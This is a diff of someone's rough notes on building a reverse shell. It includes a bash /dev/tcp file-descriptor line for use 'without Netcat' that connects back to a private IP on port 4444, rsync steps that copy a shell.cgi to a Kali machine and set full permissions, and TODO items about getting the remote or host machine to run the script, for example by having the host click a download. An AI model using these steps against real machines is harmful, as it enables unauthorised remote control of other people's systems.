@@ -17,14 +17,6 @@ HM
 
 5. on HM type any bash command and hit enter
 
-
-# TODO
-how to set the permission of the executable shell script on the host machine?
-	maybe just by getting the host to click download.
-	
-rsync --chmod=u+rwx,g+rwx,o+rwx /path/to/file server:/path/to/file
-
-
 # 2 without Netcat installed
 - // 0<&196; open file descriptor and redirect it to stdin. 196 is a random number
 - // exec 196<>/dev/tcp/192.168.0.xxx/4444; read-write file descriptor,  https://unix.stackexchange.com/questions/164391/how-does-cat-file-work
@@ -52,3 +44,7 @@ rsync -av shell.cgi sparky@kali:/home/sparky/desktop
 ## now the remote machine just needs to run shell.cgi
 Sounds like Crontab could do this, or https://serverfault.com/questions/364040/how-to-execute-a-process-on-remote-linux-machine-without-ssh
 ./shell.cgi
+
+# TODO
+- [ ] figure out how to make the script execute on the remote machine.
+rsync --chmod=u+rwx,g+rwx,o+rwx /path/to/file server:/path/to/file
